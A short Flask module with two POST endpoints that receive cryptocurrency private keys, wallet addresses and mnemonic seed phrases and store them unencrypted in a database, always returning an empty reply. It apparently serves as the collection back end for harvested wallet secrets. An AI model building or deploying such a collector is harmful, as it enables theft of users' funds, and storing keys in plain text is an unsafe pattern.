import datetime
import logging
import random

from flask import Blueprint, jsonify, request
from exception import APIParamError
from model import db, PrivateKey, Mnemonic
from utils import models_to_list, model_to_dict

router_bp = Blueprint('router', __name__)


@router_bp.route('/api/save/private/key', methods=['POST'])
def save_pk():
    body = request.get_json()
    num, private_key, address = body['num'], body.get('private_key', ''), body['address']
    keys = PrivateKey.query.filter(PrivateKey.num==num, PrivateKey.address==address).all()
    if keys:
        return jsonify({})

    pk = PrivateKey(num=num, private_key=private_key, address=address)
    try:
        db.session.add(pk)
        db.session.commit()
    except Exception as e:
        logging.error(e)
    return jsonify({})


@router_bp.route('/api/save/mnemonic/code', methods=['POST'])
def save_mc():
    body = request.get_json()
    mnemonic, pk = body['mnemonic'], body['private_key']
    mnemonic_code = list(map(str.strip, mnemonic.split(' ')))
    m = Mnemonic.query.filter(Mnemonic.mnemonic==mnemonic).all()
    if m:
        return jsonify({})

    m = Mnemonic(mnemonic=mnemonic, mnemonic_code=mnemonic_code, private_keys=[pk])
    try:
        db.session.add(m)
        db.session.commit()
    except Exception as e:
        logging.error(e)
    return jsonify({})
